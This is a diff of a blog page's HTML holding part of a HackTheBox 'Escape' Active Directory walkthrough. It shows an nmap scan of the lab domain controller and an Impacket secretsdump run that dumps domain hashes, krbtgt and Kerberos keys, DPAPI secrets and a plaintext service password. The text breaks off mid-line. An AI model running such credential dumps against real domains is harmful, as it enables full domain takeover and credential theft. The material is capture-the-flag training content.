@@ -1,219 +1,158 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh">
+
 <head>
-  <meta charset="utf-8">
+  <!-- Website mata -->
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<!-- Disable transformation -->
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<!-- Website description -->
+
+<meta name="description" content="HackTheBox——Tracks AD Escape" />
+
+
+<!-- Website keywords -->
+
+<meta name="keywords" content="writeup, N0nome`s Fucking Life" />
+
+
+
+
+<!-- Website rss -->
+
+<link rel="alternate" href="/default" title="N0nome`s Fucking Life" >
+
+
+<!-- Website favicon -->
+
+<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=3.0.0" />
+
+
+<!-- Canonical, good for google search engine -->
+<link rel="canonical" href="https://n0nome.github.io/2025/06/19/Escape/HackTheBox——Tracks AD Escape/" />
+
+<!-- Fancybox styling -->
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+
+
+<!-- MathJax (LaTeX) support -->
+
+
+<!-- Theme styling -->
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=3.0.0" />
+
+<!-- Analytics and push -->
+
+
+
   
-  <title>HackTheBox——Tracks AD Escape | Hexo | </title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<!-- LeanCloud Counter -->
+
+
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null,"server_url":null,"cdn":null},"toc":true,"fancybox":true,"latex":false};
+</script>
   
-  <meta name="theme-color" content="#3F51B5">
-  
-  
-  <meta name="keywords" content="writeup">
-  <meta name="description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 nmap123456789101112131415">
-<meta property="og:type" content="article">
-<meta property="og:title" content="HackTheBox——Tracks AD Escape">
-<meta property="og:url" content="http://example.com/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 nmap123456789101112131415">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/images/escape.png">
-<meta property="og:image" content="http://example.com/images/escape-1.png">
-<meta property="og:image" content="http://example.com/images/escape-2.png">
-<meta property="og:image" content="http://example.com/images/escape-3.png">
-<meta property="article:published_time" content="2025-06-19T13:59:05.047Z">
-<meta property="article:modified_time" content="2025-06-19T13:59:05.047Z">
-<meta property="article:author" content="John Doe">
-<meta property="article:tag" content="writeup">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/escape.png">
-  
-    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  <meta name="summary" content="">
-  <link rel="shortcut icon" href="/favicon.ico">
-  
-<link rel="stylesheet" href="/css/style.css">
+  <title>HackTheBox——Tracks AD Escape - N0nome`s Fucking Life</title>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 
 <body>
-  <div id="loading" class="active"></div>
-
-  <nav id="menu" class="hide" >
-   <div class="inner flex-row-vertical">
-  <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
-      <i class="icon icon-lg icon-close"></i>
-  </a>
-  <div class="brand-wrap">
-    <div class="brand">
-      <a href="/" class="avatar"><img src="/img/logo.jpg"></a>
-      <hgroup class="introduce">
-        <h5 class="nickname">John Doe</h5>
-        <a href="mailto:634206017@qq.com" title="634206017@qq.com" class="mail">634206017@qq.com</a>
-      </hgroup>
-    </div>
+  <div class="scrollPercentage"></div>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">N0nome`s Fucking Life</a>
   </div>
-  <div class="scroll-wrap flex-col">
-    <ul class="nav">
-      
-          <li class="waves-block waves-effect">
-            <a href="/"  >
-              <i class="icon icon-lg icon-home"></i>
-              主页
-            </a>
-          </li>
-      
-          <li class="waves-block waves-effect">
-            <a href="/archives"  >
-              <i class="icon icon-lg icon-archives"></i>
-              Archives
-            </a>
-          </li>
-      
-          <li class="waves-block waves-effect">
-            <a href="/tags"  >
-              <i class="icon icon-lg icon-tags"></i>
-              Tags
-            </a>
-          </li>
-      
-          <li class="waves-block waves-effect">
-            <a href="https://github.com/yscoder" target="_blank" >
-              <i class="icon icon-lg icon-github"></i>
-              Github
-            </a>
-          </li>
-      
-          <li class="waves-block waves-effect">
-            <a href="http://www.weibo.com/ysweb" target="_blank" >
-              <i class="icon icon-lg icon-weibo"></i>
-              Weibo
-            </a>
-          </li>
-      
-          <li class="waves-block waves-effect">
-            <a href="/404"  >
-              <i class="icon icon-lg icon-link"></i>
-              测试
-            </a>
-          </li>
-      
-    </ul>
-
-    <footer class="footer">
-  <p><a rel="license" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons License" style="border-width:0;vertical-align:middle;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAAAPCAMAAABEF7i9AAAAllBMVEUAAAD///+rsapERER3d3eIiIjMzMzu7u4iIiKUmZO6v7rKzsoODg4RERFVVVUNDQ0NDg0PEA8zMzNLTEtbXltmZmZydnF9gn2AgICPkI+ZmZmqqqq7u7vFxsXIzMgNDQwZGRkgICAhISEkJSMnKCcuMC4xMzE5Ozk7PTtBQkFCQkJDQ0Nna2eGhoaHh4ezuLLGysbd3d1wVGpAAAAA4UlEQVR42q2T1xqCMAyFk7QsBQeKA9x7j/d/OSm22CpX0nzcpA1/T05aAOuBVkMAScQFHLnEwoCo2f1TnQIGoVMewjZEjVFN4GH1Ue1Cn2jWqwfsOOj6wDwGvotsl/c8lv7KIq1eLOsT0HMFHMIE/RZyHnlphryT9zyV+8WH5e8yQw3wnQvgAFxPTKUVi555SHR/lOfLMgVTeDlSfN+TaoUsiTyeIm+bCkHvCA2FUKG48LDtYBZBknsYP/G8NTw0gaaHyuQf4H5pecrB/FYCT2sL9zAfy1Xyjou6L8X2W7YcLyBZCRtnq/zfAAAAAElFTkSuQmCC" /></a></p>
-  <p>Hexo &copy; 2025</p>
-  <p>Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme
-  <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a></p>
-  <a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-2x icon-rss-square"></i></a>
-</footer>
-
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
   </div>
 </div>
 
-  </nav>
-  <main id="main">
-    <header class="top-header" id="header">
-    <div class="flex-row">
-        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
-          <i class="icon icon-lg icon-navicon"></i>
-        </a>
-        <div class="flex-col header-title ellipsis">HackTheBox——Tracks AD Escape</div>
-        
-        <div class="search-wrap" id="search-wrap">
-            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
-                <i class="icon icon-lg icon-chevron-left"></i>
-            </a>
-            <input type="text" id="key" class="search-input " autocomplete="off" placeholder="输入感兴趣的关键字">
-            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
-                <i class="icon icon-lg icon-search"></i>
-            </a>
-        </div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    
+    <a href="/">
+      <li class="mobile-menu-item">
         
         
-        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-share">
-            <i class="icon icon-lg icon-share-alt"></i>
-        </a>
+        Home              </li>
+    </a>
+    
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+      <div class="logo-wrapper">  
+  <a href="/." class="logo">N0nome`s Fucking Life</a>  
+</div>  
+  
+<nav class="site-navbar">  
+    
+    <ul id="menu" class="menu">  
         
+        <li class="menu-item">  
+          <a class="menu-item-link" href="/">  
+              
+              
+              Home  
+              
+          </a>  
+        </li>  
+        
+    </ul>  
+    
+</nav>  
+
+    </header>
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+  <header class="post-header">
+    <h1 class="post-title">
+      
+      HackTheBox——Tracks AD Escape
+      
+    </h1>
+
+    <div class="post-meta">
+      <span class="post-time">
+        2025-06-19
+      </span>
+      
+      
+      
     </div>
-</header>
-<header class="content-header">
-  <div class="container">
-    <h1 class="author">HackTheBox——Tracks AD Escape</h1>
-    <h5 class="subtitle">
-        
-            <time datetime="2025-06-19T13:59:05.047Z" itemprop="datePublished" class="page-time">
-  2025-06-19
-</time>
+  </header>
 
-
-        
-    </h5>
+  
+  <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">1.</span> <span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#smb-enum"><span class="toc-number">1.1.</span> <span class="toc-text">smb enum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ntlm-hash-hijack"><span class="toc-number">1.2.</span> <span class="toc-text">ntlm hash hijack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-sql-svc"><span class="toc-number">2.</span> <span class="toc-text">shell as sql_svc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get-pass-at-bak"><span class="toc-number">2.1.</span> <span class="toc-text">get pass at .bak</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-Ryan-Cooper"><span class="toc-number">3.</span> <span class="toc-text">shell as Ryan.Cooper</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC1-classic-abuse"><span class="toc-number">3.1.</span> <span class="toc-text">ESC1 classic abuse</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hashes"><span class="toc-number">4.</span> <span class="toc-text">Hashes</span></a></li></ol>
+    </div>
   </div>
-</header>
+  
 
-    <div class="container body-wrap">
-      <article id="post-Escape/HackTheBox——Tracks AD Escape" 
-  class="article article-type-post" itemprop="blogPost">
-    <div class="post-meta flex-row">
-        
-	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
-
-    </div>
-    <div class="post-body">
-        <aside class="post-widget" id="post-widget">
-
-            
-            <div class="post-share" id="post-share">
-    <div class="tit">分享到：</div>
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" href="javascript:;" data-title="微博" data-service="tsina">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns" href="javascript:;" data-title="微信" data-service="weixin">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" href="javascript:;" data-title=" QQ" data-service="cqq">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
-        <a class="facebook share-sns" href="javascript:;" data-title=" Facebook" data-service="fb">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" href="javascript:;" data-title=" Twitter" data-service="twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="douban share-sns" href="javascript:;" data-title="豆瓣" data-service="douban">
-          豆
-        </a>
-      </li>
-    </ul>
- </div>
-
-            
-
-            
-            <nav class="post-toc-wrap" id="post-toc">
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#nmap"><span class="post-toc-number">1.</span> <span class="post-toc-text">nmap</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#smb-enum"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">smb enum</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ntlm-hash-hijack"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">ntlm hash hijack</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shell-as-sql-svc"><span class="post-toc-number">2.</span> <span class="post-toc-text">shell as sql_svc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#get-pass-at-bak"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">get pass at .bak</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shell-as-Ryan-Cooper"><span class="post-toc-number">3.</span> <span class="post-toc-text">shell as Ryan.Cooper</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ESC1-classic-abuse"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">ESC1 classic abuse</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Hashes"><span class="post-toc-number">4.</span> <span class="post-toc-text">Hashes</span></a></li></ol>
-            </nav>
-            
-        </aside>
-
-        <div class="post-main">
-
-            <div class="post-content" id="post-content" itemprop="postContent">
-            <p>Welcome to N0nome&#96;s F**king <a target="_blank" rel="noopener" href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
+  <div class="post-content">
+    
+    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
 <p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><img src="/images/escape.png"></p>
 <h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-04-30 15:00:23Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn      </span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:                                                                             </span><br><span class="line">| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel</span><br><span class="line">| Not valid before: 2024-01-18T23:03:57                                                                                                                                                            </span><br><span class="line">|_Not valid after:  2074-01-05T23:03:57</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-04-30T15:01:59+00:00; +7h59m59s from scanner <span class="keyword">time</span>.</span><br><span class="line">445/tcp   open  microsoft-ds?                                                                    </span><br><span class="line">464/tcp   open  kpasswd5?                                                                        </span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel</span><br><span class="line">| Not valid before: 2024-01-18T23:03:57</span><br><span class="line">|_Not valid after:  2074-01-05T23:03:57</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-04-30T15:01:59+00:00; +8h00m00s from scanner <span class="keyword">time</span>.</span><br><span class="line">1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM</span><br><span class="line">|_ms-sql-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback     </span><br><span class="line">| Not valid before: 2025-04-30T14:54:57</span><br><span class="line">|_Not valid after:  2055-04-30T14:54:57                                                                                                                                                            </span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-04-30T15:01:59+00:00; +7h59m59s from scanner <span class="keyword">time</span>.</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                                                        </span><br><span class="line">| ssl-cert: Subject:                                                                                                                                                                               </span><br><span class="line">| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel</span><br><span class="line">| Not valid before: 2024-01-18T23:03:57</span><br><span class="line">|_Not valid after:  2074-01-05T23:03:57</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-04-30T15:01:59+00:00; +7h59m59s from scanner <span class="keyword">time</span>.</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel</span><br><span class="line">| Not valid before: 2024-01-18T23:03:57</span><br><span class="line">|_Not valid after:  2074-01-05T23:03:57</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-04-30T15:01:59+00:00; +8h00m00s from scanner <span class="keyword">time</span>.</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49690/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49711/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49721/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10</span><br><span class="line">Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-04-30T15:01:23</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s</span><br></pre></td></tr></table></figure>
 <p>先加hosts</p>
@@ -253,173 +192,177 @@
 <h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py -k -no-pass sequel.htb/administrator@dc.sequel.htb             </span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra                                                         </span><br><span class="line">                                                                                                                                                                                                   </span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state                                                   </span><br><span class="line">[*] Starting service RemoteRegistry                                                              </span><br><span class="line">[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d                                  </span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)               </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:cbf36a6101cb1a15e11f776ec6d5d77b:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                     </span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[-] SAM hashes extraction <span class="keyword">for</span> user WDAGUtilityAccount failed. The account doesn<span class="string">&#x27;t have hash information.</span></span><br><span class="line"><span class="string">[*] Dumping cached domain logon information (domain/username:hash)                                                                                                                                 </span></span><br><span class="line"><span class="string">[*] Dumping LSA Secrets                                                                          </span></span><br><span class="line"><span class="string">[*] $MACHINE.ACC                                                                                 </span></span><br><span class="line"><span class="string">sequel\DC$:plain_password_hex:cc9d5ea540f6ae97c66daeedd41fe8ecaf6cee114ac8eaf357da86e1ce2fa2987fc73fd54a5db4e07d16bd9e83275f6484e592610cc294f3f683793b2653e842067a03d96a1bd83cbe33ad48f4d8e4555a44b</span></span><br><span class="line"><span class="string">0bb95fa5f36af8f6ca77064f2985e3a3e08925d7d19c686f93b9b69d4a1ab348e92d61e242d3c4d636ae57e7e0766f095526dcf5ef85a64cf5cd213e04ecde1aa86706ea1a36e77a0ed94e0c869efa288d5b47e6874885969f180b029cd3ead8e2e</span></span><br><span class="line"><span class="string">e128b6f80b83f9500fb7e4e0dbc340e74bf43caaf5d0f103fcf73eed686661ff104ba1a1498fc0586fa208364bb4c8483de977525db1b3bebef96e86</span></span><br><span class="line"><span class="string">sequel\DC$:aad3b435b51404eeaad3b435b51404ee:d1e9e6b7560bdb3317784b603a19c20e:::      </span></span><br><span class="line"><span class="string">[*] DPAPI_SYSTEM                                                                                 </span></span><br><span class="line"><span class="string">dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd                                      </span></span><br><span class="line"><span class="string">dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931                                                                                                                                           </span></span><br><span class="line"><span class="string">[*] NL$KM </span></span><br><span class="line"><span class="string"> 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.&gt;.J......I.</span></span><br><span class="line"><span class="string"> 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..</span></span><br><span class="line"><span class="string"> 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...</span></span><br><span class="line"><span class="string"> 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..</span></span><br><span class="line"><span class="string">NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac</span></span><br><span class="line"><span class="string">[*] _SC_MSSQL$SQLMOCK </span></span><br><span class="line"><span class="string">sequel\sql_svc:REGGIE1234ronnie</span></span><br><span class="line"><span class="string">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span></span><br><span class="line"><span class="string">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span></span><br><span class="line"><span class="string">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::</span></span><br><span class="line"><span class="string">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span><br><span class="line"><span class="string">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::</span></span><br><span class="line"><span class="string">Tom.Henn:1103:aad3b435b51404eeaad3b435b51404ee:22e99d2b3043bbb0a480705c9b0e71ac:::</span></span><br><span class="line"><span class="string">Brandon.Brown:1104:aad3b435b51404eeaad3b435b51404ee:f562f509ad646c666f83b45f90a58af3:::</span></span><br><span class="line"><span class="string">Ryan.Cooper:1105:aad3b435b51404eeaad3b435b51404ee:98981eed8e9ce0763bb3c5b3c7ed5945:::</span></span><br><span class="line"><span class="string">sql_svc:1106:aad3b435b51404eeaad3b435b51404ee:1443ec19da4dac4ffc953bca1b57b4cf:::</span></span><br><span class="line"><span class="string">James.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:cc69ea05e9ab430702679d5706b39075:::</span></span><br><span class="line"><span class="string">Nicole.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:235da7fbef7d0861301b4078d56afdc5:::</span></span><br><span class="line"><span class="string">DC$:1000:aad3b435b51404eeaad3b435b51404ee:d1e9e6b7560bdb3317784b603a19c20e:::</span></span><br><span class="line"><span class="string">[*] Kerberos keys grabbed</span></span><br><span class="line"><span class="string">Administrator:aes256-cts-hmac-sha1-96:0ba0bb35571c5d0e19849c9c2b92539a4ce6a8fd3dd6348fb6a0888797dedd16</span></span><br><span class="line"><span class="string">Administrator:aes128-cts-hmac-sha1-96:37cbf2133cdec2b7e5531957a21e791f</span></span><br><span class="line"><span class="string">Administrator:des-cbc-md5:5d76e0d3c245a2a4</span></span><br><span class="line"><span class="string">krbtgt:aes256-cts-hmac-sha1-96:b3f74f6e968fb5d2cf17f36f417bc46259623626953ed30f8faf3cd00b91c8de</span></span><br><span class="line"><span class="string">krbtgt:aes128-cts-hmac-sha1-96:919e6861b6306e3367a9223a154473ec</span></span><br><span class="line"><span class="string">krbtgt:des-cbc-md5:6d1f1cd391e01a91</span></span><br><span class="line"><span class="string">Tom.Henn:aes256-cts-hmac-sha1-96:bb3886d7e3201d11055cf8a2ef587d83b448d33d77aab36dd84b4ce8c59fc0a2 </span></span><br><span class="line"><span class="string">Tom.Henn:aes128-cts-hmac-sha1-96:0a221bf0f01f109c86cc1668783b80d3</span></span><br><span class="line"><span class="string">Tom.Henn:des-cbc-md5:1a46dc3858150401</span></span><br><span class="line"><span class="string">Brandon.Brown:aes256-cts-hmac-sha1-96:1aad383c76610c43bf638873ff5d7f0d7cd5cffccdfb6dd16754f15b83217550</span></span><br><span class="line"><span class="string">Brandon.Brown:aes128-cts-hmac-sha1-96:cb92957a61468212c2e1f26f2958b892</span></span><br><span 